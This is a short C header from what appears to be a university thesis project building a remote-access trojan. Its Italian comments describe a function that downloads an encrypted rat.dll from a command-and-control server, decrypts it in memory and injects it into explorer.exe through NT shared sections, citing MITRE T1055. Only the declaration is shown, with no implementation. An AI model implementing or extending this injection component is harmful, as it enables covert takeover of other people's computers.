/*
 * process_inject.h
 * Iniezione fileless in explorer.exe via NtCreateSection + NtMapViewOfSection
 *
 * MITRE ATT&CK: T1055, T1055.003
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */
#pragma once
#include <windows.h>

/*
 * Scarica rat.dll cifrata dal C2, decripta in RAM,
 * inietta in explorer.exe via sezione NT condivisa.
 * Ritorna 0 se ok, -1 se fallisce.
 */
int inject_dll_into_explorer(void);
